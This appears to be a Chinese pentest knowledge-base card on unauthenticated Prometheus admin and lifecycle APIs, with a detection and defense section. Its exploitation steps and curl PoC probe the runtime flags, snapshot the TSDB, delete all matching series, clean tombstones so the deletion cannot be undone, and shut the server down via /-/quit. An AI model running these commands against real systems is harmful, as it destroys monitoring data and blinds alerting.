---
id: cloud-prometheus-unauth-admin-api-tsdb-snapshot-delete
title: Prometheus 未授权管理 API：status/flags 探测后调用 tsdb snapshot/delete_series 快照或删除监控数据
type: scenario
domain: cloud
path: cloud
technique: prometheus-unauth-admin-api-tsdb
tags:
- prometheus
- monitoring
- cloud-native
- unauth
- admin-api
- tsdb
- data-destruction
- exposure
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V655
  verified_at: '2026-11-13T05:40:39+08:00'
  notes: 已对照原文与17张图核对：/api/v1/status/flags 截图显示 web.enable-admin-api:"true"（图14）与另一实例 web.enable-lifecycle:"true"（图15）；POST /api/v1/admin/tsdb/snapshot 有实测返回 data.name 快照名（图16），与卡内一致；delete_series/clean_tombstones 仅来自官方文档截图（图17），/-/quit 仅来自 flags 说明，已在卡内 PoC 后如实标注，且 DoS 未作主线（仅步骤6可选）。未验证点：delete_series/clean_tombstones、/-/quit 未在原文环境执行；未执行 PoC；frontmatter 无 sources/source_url。
url: /docs/cloud/cloud-prometheus-unauth-admin-api-tsdb-snapshot-delete/
draft: false
kb_aliases:
- Prometheus admin API 未授权
- web.enable-admin-api
- tsdb snapshot
- delete_series
- clean_tombstones
- 监控数据删除
---

## 一句话结论

Prometheus 默认禁用管理 API，但部分部署为运维方便开启 `--web.enable-admin-api`（`web.enable-admin-api: "true"`）且未做认证；攻击者先用 `/api/v1/status/flags` 确认该开关，再 `POST /api/v1/admin/tsdb/snapshot` 可把全部 TSDB 数据快照落盘并拿到目录名，`POST /api/v1/admin/tsdb/delete_series`（配合 `clean_tombstones`）可按选择器删除任意或全部监控指标，造成监控数据被复制/销毁。

## 原理

- **管理 API 是可选开关**：Prometheus 把快照、删除、清理 tombstone 等破坏性操作放在 `/api/v1/admin/` 下，只有启动参数 `--web.enable-admin-api` 或配置 `web.enable-admin-api: "true"` 时才注册；默认关闭。`/api/v1/status/flags` 会返回运行时 flag 值，攻击者据此判断是否启用。
- **snapshot**：`POST /api/v1/admin/tsdb/snapshot` 把当前 TSDB 数据快照到数据目录下 `snapshots/<datetime>-<rand>`，返回该目录名；可选 `skip_head` 跳过未压缩到磁盘的 head block。快照是完整指标数据的副本，若数据目录被其它服务/静态文件服务器暴露，可能进一步导致数据泄露，同时快照本身会占用磁盘。
- **delete_series**：`POST/PUT /api/v1/admin/tsdb/delete_series?match[]=<series_selector>[&start=...][&end=...]` 按标签选择器把序列标记删除（写 tombstone）；不指定 start/end 时删除匹配序列的全部数据。删除后数据不会立即物理清除，`POST /api/v1/admin/tsdb/clean_tombstones` 强制清理，使删除不可恢复。
- **lifecycle**：另一个开关 `--web.enable-lifecycle`（`web.enable-lifecycle: "true"`）开放 `POST /-/reload`（重载配置）与 `POST /-/quit`（退出进程）；后者属于服务不可用类，本卡不以其为主要危害，但在同一未授权暴露面下需一并考虑。
- **为什么可复用**：这是一组标准的 HTTP API，无 CSRF token、无认证，只要开关打开，任何能访问 9090 的人都能调用；很多团队为使用 snapshot/delete 做容量治理或调试而开启，之后忘记关闭或加鉴权。

## 触发条件

- Prometheus 9090 可达且未配置认证（`web.config.file`/反向代理）。
- 启动参数或配置中 `web.enable-admin-api: "true"`；若还开启 `web.enable-lifecycle: "true"`，则 reload/quit 也可用。
- 攻击者具备对监控数据的破坏动机（破坏证据、干扰告警、勒索）或需要复制指标数据。

## 利用步骤

1. **确认开关**：`GET /api/v1/status/flags`，读取 `web.enable-admin-api`、`web.enable-lifecycle` 的值；同时可看 `storage.tsdb.path`、`storage.tsdb.retention.time` 了解数据目录与保留期。
2. **确认身份与版本**：`GET /api/v1/status/buildinfo`，并访问 `/graph` 确认是 Prometheus 前端。
3. **创建快照**：`POST /api/v1/admin/tsdb/snapshot`，读取响应中的 `data.name`（形如 `202209...Z-...`），即数据目录下 `snapshots/<name>`。
4. **删除指标**：按目标选择器分批删除，例如整组 job `match[]={job="xxx"}`，或全部序列 `match[]={__name__=~".+"}`；不传 start/end 即清空匹配序列的历史数据。
5. **清理 tombstone**：`POST /api/v1/admin/tsdb/clean_tombstones`，使删除落盘、难以恢复。
6. **（可选）生命周期操作**：`POST /-/reload` 重载配置、`POST /-/quit` 停止进程；前者可用于触发配置重读，后者是 DoS，仅在授权测试中验证存在性。
7. **留证与影响评估**：记录 flags、快照名、删除选择器与返回码；评估被删指标对应的业务告警是否失效、快照是否可通过其它路径读取。

## PoC

```bash
# 1) 探测管理开关
curl -s http://target:9090/api/v1/status/flags \
  | jq '.data | {"admin": .["web.enable-admin-api"], "lifecycle": .["web.enable-lifecycle"], "path": .["storage.tsdb.path"]}'

# 2) 创建全量快照（返回快照目录名）
curl -s -X POST http://target:9090/api/v1/admin/tsdb/snapshot

# 3) 删除匹配序列（示例：删除某 job 的全部数据）
curl -s -X POST -g 'http://target:9090/api/v1/admin/tsdb/delete_series?match[]={job="node"}'

# 4) 清理 tombstone，使删除不可恢复
curl -s -X POST http://target:9090/api/v1/admin/tsdb/clean_tombstones

# 5) 若 web.enable-lifecycle=true（DoS 类，仅验证存在性）
curl -s -X POST http://target:9090/-/quit
```

快照响应示例：

```json
{"status":"success","data":{"name":"20220921T...Z-...44174"}}
```

说明：原文实测了 `snapshot` 调用（图16 返回 `data.name` 快照名）；`delete_series`、`clean_tombstones` 仅来自官方 API 文档截图（图17），`/-/quit` 仅来自 flags 截图说明（图15 `web.enable-lifecycle: "true"`），原文均未实际调用。`delete_series` 属数据销毁、`/-/quit` 属 DoS，仅在授权测试中验证能力存在性，不作常规利用主线。

## 变体与关联

- **按 job/实例精准删除**：`match[]={job="..."}`、`match[]={instance="10.0.0.1:9100"}`，比全量删除更隐蔽。
- **快照利用**：快照是完整 TSDB 副本；若 Prometheus 数据目录被 NFS/静态服务器/备份任务二次暴露，可结合文件读取或备份窃取获取全部指标（含主机名、业务标签、部分凭据型标签）。
- **同族组件**：Thanos/Mimir/Cortex 的管理与删除 API、Alertmanager 的静默 API 也有类似未授权面，思路相同。
- 关联卡片：[[pentest-recon-prometheus-unauth-config-targets-credential-leak]]（同一服务的未授权信息泄露）、[[cloud-k8s-k8s-etcd-unauth]]（未授权管理面导致数据访问/破坏的同类场景）。

## 检测与防御

- **最小化开关**：非必要不开启 `web.enable-admin-api`/`web.enable-lifecycle`；需要时限制为 localhost 或放在认证反向代理之后，并在使用后关闭。
- **认证与网络**：配置 `web.config.file` 的 basic auth/TLS，9090 仅监控网段可达；禁止公网暴露。
- **审计与检测**：在访问日志/网关日志中监控 `POST /api/v1/admin/tsdb/snapshot`、`delete_series`、`clean_tombstones`、`/-/reload`、`/-/quit`；监控数据目录下 `snapshots/` 目录异常增长、TSDB 文件被大量删除；对 `/api/v1/status/flags` 的批量探测告警。
- **恢复**：保留快照/备份与保留期策略；发现未授权删除后立即隔离实例、从快照恢复，并排查同网段其它 Prometheus/Thanos。
